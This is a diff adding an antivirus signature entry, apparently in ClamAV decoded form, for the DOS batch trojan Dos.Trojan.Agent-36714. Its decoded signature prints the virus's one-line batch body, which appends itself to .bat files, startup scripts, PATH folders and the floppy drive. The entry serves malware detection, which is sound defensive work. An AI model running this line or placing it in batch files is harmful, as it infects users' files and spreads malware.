@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36714
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@rem bat.mini by glitch | for %%g in (*.bat %path% c:\winstart.bat %winbootdir%\dosstart.bat a:\) do find "bat.mini"<%0.bat>>%%g 
